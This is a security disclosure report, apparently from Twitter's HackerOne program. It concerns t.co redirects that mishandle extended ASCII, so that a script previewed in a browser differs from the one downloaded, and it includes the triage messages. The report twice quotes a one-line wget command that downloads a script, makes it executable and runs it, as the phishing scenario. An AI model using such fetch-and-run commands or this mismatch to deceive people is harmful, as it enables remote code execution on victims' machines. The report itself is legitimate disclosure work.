title: Bad extended ascii handling in HTTP 301 redirects of t.co

profile.name: Twitter
profile.about: Twitter helps you create and share ideas and information instantly, without barriers.

vulnerability_information:
This proof of concept is conceived and tested on Linux+bash (because I'm an user), and of course is harmless.

Imagine a tweet or a line in a tutorial that look like this : 
`wget http://t.co/abP2XEsm82 -O cafe.sh && chmod +x cafe.sh && ./cafe.sh`
Of course, you'll test the link in a browser to see if the script downloaded is harmless. It's the case. So you copy/paste the whole command in bash and execute it. And here is the issue, because the script previewed and the one downloaded are different.

All the details of the issue are in the script downloaded. I think the correction is easy enough (change the padding of the extended ascii char), but the possibilities of phishing with this bug are big.

Anyway, I'm available if you have any question, @Cqoicebordel or here.
vulnerability_information_html:
This proof of concept is conceived and tested on Linux+bash (because I'm an user), and of course is harmless.

Imagine a tweet or a line in a tutorial that look like this :
wget http://t.co/abP2XEsm82 -O cafe.sh && chmod +x cafe.sh && ./cafe.sh
Of course, you'll test the link in a browser to see if the script downloaded is harmless. It's the case. So you copy/paste the whole command in bash and execute it. And here is the issue, because the script previewed and the one downloaded are different.

All the details of the issue are in the script downloaded. I think the correction is easy enough (change the padding of the extended ascii char), but the possibilities of phishing with this bug are big.

Anyway, I'm available if you have any question, @Cqoicebordel or here.

activities.message:
Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.

Thank you for helping keep Twitter secure!

activities.message: Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.

activities.message: No problem of course. Thanks for the bounty and the keeping me updated :o)

activities.message:
So, no news at all ? No new bounty to be on par with what is announced on https://hackerone.com/twitter ? No disclosure ? Nothing at all ?
That's not the way of building trust I think...

activities.message: Sorry we fixed this a while back and neglected to tell you.  If you would like to discuss this issue publicly, please follow the HackerOne process for requesting public disclosure. More details can be found at https://hackerone.com/guidelines.  Thank you for helping keep Twitter secure!
